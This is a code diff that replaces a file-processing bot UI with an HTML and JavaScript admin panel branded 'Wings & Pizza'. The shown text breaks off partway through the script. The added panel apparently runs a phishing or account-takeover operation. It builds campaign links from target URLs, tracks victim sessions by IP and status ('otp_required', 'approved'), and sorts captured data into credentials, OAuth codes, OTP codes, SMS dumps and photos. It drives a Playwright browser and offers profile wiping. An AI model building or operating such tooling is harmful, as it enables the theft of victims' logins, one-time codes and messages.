@@ -1,441 +1,561 @@
-<!DOCTYPE html>
-<html lang="en" class="h-full bg-[#07090e]">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Terminal & Automation Hub</title>
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Lucide Icons -->
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        brand: {
-                            50: '#eef2ff',
-                            100: '#e0e7ff',
-                            500: '#6366f1',
-                            600: '#4f46e5',
-                            700: '#4338ca',
-                        }
-                    },
-                    animation: {
-                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
-                        'glow': 'glow 3s infinite alternate',
-                    },
-                    keyframes: {
-                        glow: {
-                            '0%': { opacity: 0.4, transform: 'scale(1)' },
-                            '100%': { opacity: 0.8, transform: 'scale(1.05)' },
-                        }
-                    }
-                }
-            }
-        }
-    </script>
-    <style>
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #090d16;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #1e293b;
-            border-radius: 9999px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: #334155;
-        }
-        
-        .glass-panel {
-            background: rgba(15, 23, 42, 0.65);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wings & Pizza · Admin</title>
+<style>
+:root{
+  --bg:#140a05;--panel:#1f120a;--line:#3f2417;--txt:#fef3c7;--mut:#a78b6a;
+  --acc:#ea580c;--gold:#fbbf24;--red:#dc2626;--green:#16a34a;--blue:#2563eb;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--txt);
+  font:13px -apple-system,Roboto,sans-serif}
+.hidden{display:none !important}
+button{font-family:inherit}
 
-        .glass-input {
-            background: rgba(8, 12, 22, 0.7);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.2s ease;
-        }
-        .glass-input:focus {
-            border-color: #6366f1;
-            box-shadow: 0 0 15px rgba(99, 102, 241, 0.25);
-            outline: none;
-        }
+/* ---------- lock screen ---------- */
+#lock{min-height:100vh;display:flex;align-items:center;justify-content:center;
+  background:radial-gradient(circle at 30% 20%,#2a1810,#140a05 70%);padding:20px}
+.lock-card{background:#1f120a;padding:36px 28px;border-radius:16px;
+  width:min(380px,94vw);border:1px solid #3f2417;
+  box-shadow:0 20px 60px #0008;text-align:center}
+.lock-logo{width:72px;height:72px;margin:0 auto 16px}
+.lock-card h1{font-size:22px;margin:0 0 4px;color:#fbbf24;letter-spacing:-0.3px}
+.lock-card p{color:#a78b6a;font-size:13px;margin:0 0 24px}
+.lock-card label{display:block;text-align:left;color:#a78b6a;font-size:11px;
+  text-transform:uppercase;letter-spacing:0.6px;margin:14px 0 6px;font-weight:700}
+.lock-card input{width:100%;padding:12px 14px;border-radius:10px;
+  border:1px solid #3f2417;background:#0a0502;color:#fef3c7;font-size:14px;
+  font-family:ui-monospace,monospace}
+.lock-card input::placeholder{color:#6b4a2a;font-family:-apple-system,Roboto,sans-serif}
+.lock-card button{width:100%;padding:13px;margin-top:20px;border:0;border-radius:10px;
+  background:linear-gradient(135deg,#ea580c,#dc2626);color:#fff;font-weight:700;
+  font-size:15px;cursor:pointer;box-shadow:0 8px 20px #ea580c44}
+.lock-card .err{color:#f87171;font-size:12px;margin-top:14px;min-height:16px}
+.lock-hint{font-size:11px;color:#6b4a2a;margin-top:18px;line-height:1.5}
 
-        /* Subtle ambient lighting */
-        .ambient-bg {
-            background: 
-                radial-gradient(circle at 15% 15%, rgba(99, 102, 241, 0.12) 0%, transparent 40%),
-                radial-gradient(circle at 85% 85%, rgba(139, 92, 246, 0.1) 0%, transparent 40%),
-                radial-gradient(circle at 50% 50%, rgba(15, 23, 42, 0.5) 0%, #07090e 100%);
-        }
-    </style>
+/* ---------- panel ---------- */
+header{background:var(--panel);border-bottom:1px solid var(--line);
+  padding:10px 18px;display:flex;align-items:center;gap:14px;
+  position:sticky;top:0;z-index:20}
+header .brand{display:flex;align-items:center;gap:10px;font-weight:700;
+  font-size:16px;color:var(--gold)}
+header .brand svg{width:28px;height:28px}
+.badge{background:#2a1810;padding:4px 10px;border-radius:6px;font-size:11px;
+  color:var(--mut);border:1px solid var(--line);font-family:ui-monospace,monospace}
+header .spacer{flex:1}
+header .hbtn{background:#2a1810;color:var(--gold);border:1px solid var(--line);
+  padding:6px 12px;border-radius:8px;cursor:pointer;font-size:12px;font-weight:600}
+header .hbtn:hover{background:#3f2417}
+header .hbtn.warn{color:#fca5a5;border-color:#7f1d1d}
+
+/* ---------- bar ---------- */
+.bar{background:var(--panel);border-bottom:1px solid var(--line);
+  padding:12px 18px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.bar .mag{font-size:18px;color:var(--mut)}
+.bar input{flex:1;min-width:220px;padding:10px 14px;border-radius:10px;
+  border:1px solid var(--line);background:#0a0502;color:var(--txt);font-size:13px}
+.bar input::placeholder{color:#6b4a2a}
+.bar input#nameInput{flex:0 0 200px;font-family:-apple-system,Roboto,sans-serif}
+.bar button{padding:11px 20px;border-radius:10px;border:0;
+  background:linear-gradient(135deg,var(--acc),#dc2626);color:#fff;font-weight:700;
+  font-size:13px;cursor:pointer}
+.bar button:disabled{opacity:.5;cursor:default}
+
+/* ---------- browser strip ---------- */
+.strip{background:#160c06;padding:8px 18px;border-bottom:1px solid var(--line);
+  font-size:11px;color:var(--mut);display:flex;gap:14px;align-items:center;
+  overflow-x:auto;white-space:nowrap}
+.strip .pill{background:#2a1810;padding:3px 9px;border-radius:10px;
+  border:1px solid var(--line);color:var(--gold);font-family:ui-monospace,monospace;
+  font-size:11px}
+
+/* ---------- campaigns ---------- */
+.camps{padding:10px 18px;background:var(--panel);border-bottom:1px solid var(--line);
+  max-height:140px;overflow-y:auto}
+.camp{display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:8px;
+  background:#0a0502;border:1px solid var(--line);margin-bottom:6px;font-size:12px}
+.camp .cname{font-family:ui-monospace,monospace;color:var(--gold);
+  font-weight:700;min-width:80px}
+.camp .curl{flex:1;color:var(--mut);overflow:hidden;text-overflow:ellipsis;
+  white-space:nowrap;font-size:11px}
+.camp .cbtn{background:#2a1810;color:var(--gold);border:1px solid var(--line);
+  padding:4px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600}
+.camp .cbtn:hover{background:#3f2417}
+.camp .cbtn.del{background:#7f1d1d;color:#fca5a5;border-color:#7f1d1d}
+
+/* ---------- split ---------- */
+.split{display:grid;grid-template-columns:340px 1fr;
+  height:calc(100vh - 57px - 62px - 34px - 140px);overflow:hidden}
+.list{overflow-y:auto;border-right:1px solid var(--line);background:#160c06}
+.detail{overflow-y:auto;padding:18px;background:var(--bg)}
+.sess{padding:10px 14px;border-bottom:1px solid var(--line);cursor:pointer;
+  display:flex;justify-content:space-between;align-items:center;gap:10px}
+.sess:hover{background:var(--panel)}
+.sess.sel{background:#2a1810}
+.sess .sid{font-family:ui-monospace,monospace;color:var(--gold);
+  font-size:12px;font-weight:600}
+.sess .ip{font-family:ui-monospace,monospace;font-size:11px;
+  color:var(--mut);margin-top:2px}
+.st{font-size:10px;padding:2px 8px;border-radius:10px;text-transform:uppercase;
+  font-weight:700;letter-spacing:0.4px}
+.st.pending{background:#78350f;color:#fbbf24}
+.st.started{background:#1e3a8a;color:#93c5fd}
+.st.awaiting{background:#7c2d12;color:#fdba74}
+.st.otp_required{background:#7c2d12;color:#fcd34d}
+.st.approved{background:#14532d;color:#4ade80}
+.st.manual{background:#3f3f46;color:#e4e4e7}
+
+/* ---------- detail ---------- */
+h2{font-size:12px;margin:18px 0 10px;color:var(--mut);
+  text-transform:uppercase;letter-spacing:0.6px;font-weight:700}
+.box{background:var(--panel);border:1px solid var(--line);
+  border-radius:10px;padding:12px;margin-bottom:10px}
+pre{background:#0a0502;padding:10px;border-radius:8px;overflow-x:auto;
+  font-size:11px;margin:6px 0 0 0;white-space:pre-wrap;word-break:break-all;
+  color:#fde68a;font-family:ui-monospace,monospace}
+.btn{background:var(--acc);color:#fff;border:0;padding:8px 14px;
+  border-radius:8px;cursor:pointer;font-size:12px;font-weight:600;
+  margin-right:6px;margin-bottom:6px}
+.btn.green{background:var(--green)}
+.btn.red{background:var(--red)}
+.btn.blue{background:var(--blue)}
+.btn.gray{background:#4b3325}
+.btn.gold{background:var(--gold);color:#1a0f0a}
+.tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
+.tab{padding:6px 12px;background:#2a1810;border:1px solid var(--line);
+  border-radius:6px;cursor:pointer;font-size:12px;color:var(--mut)}
+.tab.on{background:var(--acc);color:#fff;border-color:var(--acc)}
+.kind{display:inline-block;font-size:10px;padding:2px 8px;border-radius:4px;
+  background:#2a1810;color:var(--mut);margin-right:6px;
+  text-transform:uppercase;font-weight:700}
+.kind.creds,.kind.oauth_code{background:#7f1d1d;color:#fca5a5}
+.kind.otp_code{background:#422006;color:#fbbf24}
+.kind.sms_live,.kind.sms_dump{background:#14532d;color:#4ade80}
+.kind.photo_file{background:#581c87;color:#d8b4fe}
+.empty{padding:20px;color:#6b4a2a;font-size:12px;text-align:center}
+a{color:var(--gold)}
+code{font-family:ui-monospace,monospace;color:var(--gold)}
+</style>
 </head>
-<body class="h-full text-slate-200 antialiased font-sans ambient-bg selection:bg-indigo-500 selection:text-white flex items-center justify-center p-4 sm:p-6">
+<body>
 
-    <!-- AMBIENT BACKGROUND GLOWS -->
-    <div class="fixed top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[350px] bg-indigo-600/10 blur-[120px] rounded-full pointer-events-none animate-glow"></div>
-    <div class="fixed bottom-10 right-10 w-[300px] h-[300px] bg-purple-600/10 blur-[100px] rounded-full pointer-events-none"></div>
+<!-- ============ LOCK ============ -->
+<div id="lock">
+  <div class="lock-card">
+    <svg class="lock-logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+      <path d="M32 6 L58 52 A6 6 0 0 1 52 58 L12 58 A6 6 0 0 1 6 52 Z"
+            fill="#fbbf24" stroke="#b45309" stroke-width="3"/>
+      <path d="M32 14 L52 52 L12 52 Z" fill="#f97316"/>
+      <circle cx="24" cy="42" r="3" fill="#7f1d1d"/>
+      <circle cx="40" cy="42" r="3" fill="#7f1d1d"/>
+      <circle cx="32" cy="34" r="3" fill="#7f1d1d"/>
+    </svg>
+    <h1>Wings &amp; Pizza</h1>
+    <p>Admin panel · locked</p>
+    <form id="lockForm" autocomplete="off">
+      <label>API URL</label>
+      <input id="apiInput" placeholder="http://127.0.0.1:8443" required>
+      <label>Password</label>
+      <input id="pwInput" type="password" placeholder="••••••••" required>
+      <button type="submit">🔓 Unlock</button>
+      <div class="err" id="lockErr"></div>
+    </form>
+    <div class="lock-hint">The API URL must be the address of your running
+      server (python <code>server.py</code>). Both must match or the panel
+      cannot unlock.</div>
+  </div>
+</div>
 
-    <!-- MAIN CONTAINER -->
-    <div class="w-full max-w-2xl z-10">
-
-        <!-- LOCK SCREEN OVERLAY -->
-        <div id="lock-screen" class="glass-panel p-8 sm:p-10 rounded-3xl shadow-2xl relative overflow-hidden transition-all duration-300">
-            <!-- Decorative accent line -->
-            <div class="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-indigo-500 to-transparent opacity-50"></div>
-
-            <div class="flex flex-col items-center text-center mb-8">
-                <div class="w-14 h-14 rounded-2xl bg-indigo-950/80 border border-indigo-500/30 flex items-center justify-center mb-4 shadow-inner text-indigo-400">
-                    <i data-lucide="shield-check" class="w-7 h-7"></i>
-                </div>
-                <h1 class="text-2xl sm:text-3xl font-extrabold tracking-tight text-white">Bot Gateway</h1>
-                <p class="text-sm text-slate-400 mt-2 max-w-sm">Connect your Cloudflare Quick Tunnel API endpoint and verify your access token to continue.</p>
-            </div>
-
-            <!-- Lock Screen Controls -->
-            <div class="space-y-5">
-                <!-- Cloudflare API Input -->
-                <div>
-                    <label class="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">
-                        <i data-lucide="globe" class="w-3.5 h-3.5 text-indigo-400"></i>
-                        Cloudflare API Endpoint
-                    </label>
-                    <div class="flex flex-col sm:flex-row gap-2.5">
-                        <div class="relative flex-1">
-                            <input type="text" id="api-url" placeholder="https://xxxx.trycloudflare.com" 
-                                class="glass-input w-full rounded-xl px-4 py-3 text-sm text-slate-100 placeholder-slate-600">
-                        </div>
-                        <button id="connect-btn" onclick="connectAPI()" 
-                            class="group relative inline-flex items-center justify-center gap-2 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold px-6 py-3 rounded-xl text-sm transition-all duration-200 shadow-lg shadow-indigo-600/20 active:scale-[0.98]">
-                            <span>Connect</span>
-                            <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-0.5"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Live Status Badge -->
-                <div class="flex items-center justify-between glass-input px-4 py-3 rounded-xl">
-                    <div class="flex items-center gap-2">
-                        <i data-lucide="activity" class="w-4 h-4 text-slate-400"></i>
-                        <span class="text-xs font-medium text-slate-400">Connection Status</span>
-                    </div>
-                    <div id="status-badge" class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-red-950/80 text-red-400 border border-red-800/50 shadow-sm">
-                        <span class="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span>
-                        <span>Disconnected</span>
-                    </div>
-                </div>
-
-                <!-- Access Token Input -->
-                <div>
-                    <label class="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">
-                        <i data-lucide="key" class="w-3.5 h-3.5 text-indigo-400"></i>
-                        Authorization Token
-                    </label>
-                    <div class="relative">
-                        <input type="password" id="auth-token" placeholder="Connect API first to unlock token entry..." disabled
-                            class="glass-input w-full rounded-xl px-4 py-3 text-sm text-slate-100 placeholder-slate-600 opacity-50 cursor-not-allowed">
-                        <div class="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-500">
-                            <i data-lucide="lock" class="w-4 h-4" id="token-lock-icon"></i>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Authenticate Button -->
-                <button id="auth-btn" onclick="verifyToken()" disabled
-                    class="w-full bg-slate-800 text-slate-500 font-semibold py-3.5 rounded-xl text-sm transition-all duration-200 cursor-not-allowed flex items-center justify-center gap-2 border border-slate-700/50">
-                    <i data-lucide="unlock" class="w-4 h-4"></i>
-                    <span>Authenticate & Launch Console</span>
-                </button>
-            </div>
-        </div>
-
-        <!-- MAIN DASHBOARD (Hidden initially) -->
-        <div id="main-dashboard" class="hidden glass-panel p-6 sm:p-8 rounded-3xl shadow-2xl relative overflow-hidden transition-all duration-300">
-            <!-- Top Header Bar -->
-            <div class="flex flex-col sm:flex-row sm:items-center justify-between pb-6 mb-6 border-b border-slate-800/80 gap-4">
-                <div class="flex items-center gap-3">
-                    <div class="w-10 h-10 rounded-xl bg-indigo-600/20 border border-indigo-500/30 flex items-center justify-center text-indigo-400">
-                        <i data-lucide="cpu" class="w-5 h-5"></i>
-                    </div>
-                    <div>
-                        <h2 class="text-lg font-bold text-white tracking-tight flex items-center gap-2">
-                            Bot Processor Terminal
-                            <span class="text-[10px] uppercase tracking-widest bg-indigo-500/20 text-indigo-300 border border-indigo-500/30 px-2 py-0.5 rounded-full font-semibold">Active</span>
-                        </h2>
-                        <p class="text-xs text-slate-400">Process, map, format, and split dataset files seamlessly.</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Upload & Config Form -->
-            <form id="upload-form" class="space-y-5">
-                
-                <!-- File Drag-and-Drop Area -->
-                <div>
-                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Dataset Source File</label>
-                    <div class="relative group border-2 border-dashed border-slate-700/80 hover:border-indigo-500/60 rounded-2xl p-6 text-center transition-all duration-200 bg-slate-950/40 hover:bg-slate-900/50 cursor-pointer">
-                        <input type="file" id="bot-file" accept=".csv, .txt, .xlsx" onchange="handleFileSelect(event)" 
-                            class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10">
-                        
-                        <div class="flex flex-col items-center justify-center gap-2 pointer-events-none">
-                            <div class="w-12 h-12 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-indigo-400 group-hover:scale-110 transition-transform">
-                                <i data-lucide="upload-cloud" class="w-6 h-6"></i>
-                            </div>
-                            <div id="file-label-container">
-                                <p class="text-sm font-medium text-slate-200">Click or drag & drop to upload dataset</p>
-                                <p class="text-xs text-slate-500 mt-1">Supports CSV, XLSX, and TXT files</p>
-                            </div>
-                            <span id="selected-file-name" class="hidden mt-2 text-xs font-mono bg-indigo-500/10 text-indigo-300 px-3 py-1 rounded-md border border-indigo-500/20 flex items-center gap-2">
-                                <i data-lucide="file-text" class="w-3.5 h-3.5"></i>
-                                <span id="file-name-text">filename.csv</span>
-                            </span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Column Mapping Input -->
-                <div>
-                    <label class="flex items-center justify-between text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">
-                        <span>Column Layout Mapping</span>
-                        <span class="text-[10px] text-slate-500 font-normal lowercase">Comma separated sequence</span>
-                    </label>
-                    <div class="relative">
-                        <input type="text" id="column-mapping" placeholder="e.g. First Name, Last Name, Email, Phone" 
-                            class="glass-input w-full rounded-xl px-4 py-3 text-sm text-slate-100 placeholder-slate-600 font-mono text-xs">
-                    </div>
-                </div>
-
-                <!-- Format and Mode Selectors -->
-                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Export Format</label>
-                        <select id="return-format" class="glass-input w-full rounded-xl px-4 py-3 text-sm text-slate-200 bg-slate-950 focus:bg-slate-900 cursor-pointer">
-                            <option value="csv">CSV (.csv)</option>
-                            <option value="xlsx">Excel (.xlsx)</option>
-                            <option value="txt">TXT (.txt Tab Delimited)</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Return Mode</label>
-                        <select id="split-mode" onchange="toggleSplitOptions()" class="glass-input w-full rounded-xl px-4 py-3 text-sm text-slate-200 bg-slate-950 focus:bg-slate-900 cursor-pointer">
-                            <option value="one">One Go (Single Master File)</option>
-                            <option value="parts">Parts (Split Master File)</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- Items Per Part Options (Conditional) -->
-                <div id="parts-options" class="hidden p-4 rounded-xl bg-indigo-950/20 border border-indigo-500/20 transition-all">
-                    <label class="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-indigo-300 mb-2">
-                        <i data-lucide="layers" class="w-3.5 h-3.5"></i>
-                        Items Per Chunk File
-                    </label>
-                    <input type="number" id="items-per-part" value="100" min="1" 
-                        class="glass-input w-full rounded-xl px-4 py-2.5 text-sm text-slate-100 placeholder-slate-600">
-                </div>
-
-                <!-- Naming Convention Selector -->
-                <div>
-                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Output Naming Convention</label>
-                    <select id="naming-convention" class="glass-input w-full rounded-xl px-4 py-3 text-sm text-slate-200 bg-slate-950 focus:bg-slate-900 cursor-pointer">
-                        <option value="counter">Sequential Index Counter (e.g., part_1.csv, part_2.csv)</option>
-                        <option value="time">Timestamp Identifier (e.g., part_17281920_1.csv)</option>
-                    </select>
-                </div>
-
-                <!-- Submit Button -->
-                <button type="button" id="process-btn" onclick="processBotFile()" 
-                    class="w-full relative group bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3.5 rounded-xl text-sm transition-all duration-200 shadow-lg shadow-indigo-600/25 active:scale-[0.99] flex items-center justify-center gap-2">
-                    <i data-lucide="play" class="w-4 h-4 fill-white" id="process-icon"></i>
-                    <span id="process-btn-text">Execute Bot Processor</span>
-                </button>
-            </form>
-
-            <!-- Results Output Terminal Log -->
-            <div class="mt-6">
-                <div class="flex items-center justify-between mb-2">
-                    <span class="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center gap-2">
-                        <i data-lucide="terminal" class="w-3.5 h-3.5 text-indigo-400"></i>
-                        Execution Console Log
-                    </span>
-                    <button onclick="clearConsole()" class="text-[10px] text-slate-500 hover:text-slate-300 transition-colors">Clear</button>
-                </div>
-                <div id="output-results" class="glass-input w-full min-h-[90px] max-h-[160px] overflow-y-auto p-4 rounded-xl text-xs font-mono text-indigo-300/90 whitespace-pre-wrap leading-relaxed border-slate-800">Ready for task execution...</div>
-            </div>
-        </div>
-
+<!-- ============ PANEL ============ -->
+<div id="panel" class="hidden">
+  <header>
+    <div class="brand">
+      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+        <path d="M32 6 L58 52 A6 6 0 0 1 52 58 L12 58 A6 6 0 0 1 6 52 Z"
+              fill="#fbbf24" stroke="#b45309" stroke-width="3"/>
+        <path d="M32 14 L52 52 L12 52 Z" fill="#f97316"/>
+      </svg>
+      Wings &amp; Pizza
     </div>
+    <span class="badge" id="statBadge">…</span>
+    <span class="spacer"></span>
+    <button class="hbtn" onclick="wipeProfile()">🧹 wipe profile</button>
+    <button class="hbtn warn" onclick="lockNow()">🔒 lock</button>
+  </header>
 
-    <!-- SCRIPT LOGIC (IDENTICAL EVENT HANDLERS & IDS) -->
-    <script>
-        // Initialize Lucide Icons
-        lucide.createIcons();
+  <div class="bar">
+    <span class="mag">🔍</span>
+    <input id="urlInput" placeholder="Paste target URL here  ·  use {sid} for the session id">
+    <input id="nameInput" placeholder="campaign name (blank = random)">
+    <button id="createBtn">🔗 Create Link</button>
+  </div>
 
-        let activeApiUrl = "";
+  <div class="strip" id="strip"></div>
 
-        function handleFileSelect(event) {
-            const file = event.target.files[0];
-            const nameSpan = document.getElementById("selected-file-name");
-            const textSpan = document.getElementById("file-name-text");
-            const container = document.getElementById("file-label-container");
+  <div class="camps" id="camps"></div>
 
-            if (file) {
-                textSpan.innerText = file.name;
-                nameSpan.classList.remove("hidden");
-                container.classList.add("hidden");
-            } else {
-                nameSpan.classList.add("hidden");
-                container.classList.remove("hidden");
-            }
-        }
+  <div class="split">
+    <div class="list" id="list"></div>
+    <div class="detail" id="detail"><div class="empty">Select a session</div></div>
+  </div>
+</div>
 
-        function clearConsole() {
-            document.getElementById("output-results").innerText = "Console cleared. Ready...";
-        }
+<script>
+// ============ state ============
+const S = {
+  api: "",
+  token: "",
+  campaigns: [],
+  sessions: [],
+  sel: null,
+};
 
-        async function connectAPI() {
-            const urlInput = document.getElementById("api-url").value.trim();
-            const badge = document.getElementById("status-badge");
-            const tokenField = document.getElementById("auth-token");
-            const authBtn = document.getElementById("auth-btn");
-            const lockIcon = document.getElementById("token-lock-icon");
+const $ = id => document.getElementById(id);
+const esc = s => String(s ?? "").replace(/[&<>"']/g, ch =>
+  ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[ch]));
+const fmt = ts => ts ? new Date(ts * 1000).toLocaleString() : "—";
 
-            if (!urlInput) {
-                alert("Please enter a valid Cloudflare API URL.");
-                return;
-            }
+// ============ API ============
+async function api(path, opts = {}) {
+  const url = S.api.replace(/\/+$/, "") + path;
+  const o = { ...opts };
+  o.headers = { ...(o.headers || {}), "X-Admin-Token": S.token };
+  if (o.body && typeof o.body !== "string") {
+    o.body = JSON.stringify(o.body);
+    o.headers["Content-Type"] = "application/json";
+  }
+  const r = await fetch(url, o);
+  if (r.status === 401) { lockNow(); throw new Error("unauthorized"); }
+  const ct = r.headers.get("Content-Type") || "";
+  return ct.includes("json") ? r.json() : r;
+}
 
-            badge.innerHTML = `<span class="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-ping"></span><span>Connecting...</span>`;
-            badge.className = "inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-yellow-950/80 text-yellow-400 border border-yellow-800/50 shadow-sm";
+// ============ lock / unlock ============
+function showLock() {
+  $("panel").classList.add("hidden");
+  $("lock").classList.remove("hidden");
+  $("lockErr").textContent = "";
+  const saved = localStorage.getItem("wp.api") || "";
+  $("apiInput").value = saved || (location.origin.startsWith("http") ? location.origin : "");
+  $("pwInput").value = "";
+}
 
-            try {
-                // Test connection to backend
-                const response = await fetch(`${urlInput}/`);
-                if (response.ok) {
-                    activeApiUrl = urlInput;
-                    badge.innerHTML = `<span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span><span>Connected</span>`;
-                    badge.className = "inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-emerald-950/80 text-emerald-400 border border-emerald-800/50 shadow-sm";
-                    
-                    // Unlock token field and button
-                    tokenField.disabled = false;
-                    tokenField.classList.remove("opacity-50", "cursor-not-allowed");
-                    tokenField.placeholder = "Enter your secret token...";
-                    
-                    if (lockIcon) {
-                        lockIcon.setAttribute("data-lucide", "lock-keyhole-open");
-                        lucide.createIcons();
-                    }
+function showPanel() {
+  $("lock").classList.add("hidden");
+  $("panel").classList.remove("hidden");
+  refreshAll();
+}
 
-                    authBtn.disabled = false;
-                    authBtn.classList.remove("bg-slate-800", "text-slate-500", "cursor-not-allowed", "border-slate-700/50");
-                    authBtn.classList.add("bg-indigo-600", "hover:bg-indigo-500", "text-white", "shadow-lg", "shadow-indigo-600/20", "cursor-pointer");
-                } else {
-                    throw new Error("Invalid response");
-                }
-            } catch (err) {
-                badge.innerHTML = `<span class="w-1.5 h-1.5 rounded-full bg-red-500"></span><span>Connection Failed</span>`;
-                badge.className = "inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-semibold bg-red-950/80 text-red-400 border border-red-800/50 shadow-sm";
-                alert("Could not connect to the provided Cloudflare URL. Make sure start.py is running and URL is correct.");
-            }
-        }
+async function tryUnlock(apiUrl, password) {
+  try {
+    const r = await fetch(apiUrl.replace(/\/+$/, "") + "/api/admin/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ password })
+    });
+    if (!r.ok) {
+      const j = await r.json().catch(() => ({}));
+      $("lockErr").textContent = j.error || "invalid URL or password";
+      return false;
+    }
+    const j = await r.json();
+    if (!j.ok || !j.token) { $("lockErr").textContent = "no token"; return false; }
+    S.api = apiUrl;
+    S.token = j.token;
+    localStorage.setItem("wp.api", apiUrl);
+    localStorage.setItem("wp.token", j.token);
+    return true;
+  } catch (e) {
+    $("lockErr").textContent = "cannot reach " + apiUrl;
+    return false;
+  }
+}
 
-        async function verifyToken() {
-            const token = document.getElementById("auth-token").value.trim();
-            if (!token) {
-                alert("Please enter your authorization token.");
-                return;
-            }
+$("lockForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const apiUrl = $("apiInput").value.trim();
+  const pw = $("pwInput").value;
+  $("lockErr").textContent = "";
+  const ok = await tryUnlock(apiUrl, pw);
+  if (ok) showPanel();
+});
 
-            try {
-                const res = await fetch(`${activeApiUrl}/api/verify-token`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ token })
-                });
-                const data = await res.json();
-                if (res.ok) {
-                    document.getElementById("lock-screen").classList.add("hidden");
-                    document.getElementById("main-dashboard").classList.remove("hidden");
-                } else {
-                    alert(data.message || "Invalid token.");
-                }
-            } catch (e) {
-                alert("Authentication error while connecting to backend.");
-            }
-        }
+function lockNow() {
+  S.token = ""; S.api = ""; S.sel = null;
+  localStorage.removeItem("wp.token");
+  showLock();
+}
 
-        function toggleSplitOptions() {
-            const mode = document.getElementById("split-mode").value;
-            const partsOpts = document.getElementById("parts-options");
-            if (mode === "parts") {
-                partsOpts.classList.remove("hidden");
-            } else {
-                partsOpts.classList.add("hidden");
-            }
-        }
+// ============ boot ============
+(async function boot() {
+  const savedApi = localStorage.getItem("wp.api");
+  const savedTok = localStorage.getItem("wp.token");
+  if (savedApi && savedTok) {
+    S.api = savedApi; S.token = savedTok;
+    // validate
+    try {
+      const r = await fetch(savedApi + "/api/admin/sessions", {
+        headers: { "X-Admin-Token": savedTok }
+      });
+      if (r.ok) { showPanel(); return; }
+    } catch(_) {}
+  }
+  showLock();
+})();
 
-        async function processBotFile() {
-            const fileInput = document.getElementById("bot-file").files[0];
-            if (!fileInput) {
-                alert("Please select a file first.");
-                return;
-            }
+// ============ panel ============
+async function refreshAll() {
+  await loadBrowser();
+  await loadCampaigns();
+  await loadSessions();
+}
 
-            const btnText = document.getElementById("process-btn-text");
-            const btnIcon = document.getElementById("process-icon");
-            const consoleLog = document.getElementById("output-results");
+async function loadBrowser() {
+  try {
+    const j = await api("/api/admin/browser/status");
+    const s = $("strip");
+    if (!j.open) {
+      s.innerHTML = '<span class="pill">browser closed</span>';
+      return;
+    }
+    const pills = (j.pages || []).map(p => {
+      const t = p.title || p.url || "(blank)";
+      return `<span class="pill" title="${esc(p.url)}">${esc(t.slice(0,40))}</span>`;
+    }).join("") || '<span class="pill">no tabs</span>';
+    s.innerHTML = `<span>playwright:</span>${pills}`;
+  } catch(_) {}
+}
 
-            // UI Spinner loading state
-            btnText.innerText = "Processing Dataset...";
-            btnIcon.setAttribute("data-lucide", "loader-2");
-            btnIcon.classList.add("animate-spin");
-            lucide.createIcons();
+async function loadCampaigns() {
+  try {
+    const j = await api("/api/admin/campaigns");
+    S.campaigns = j.campaigns || [];
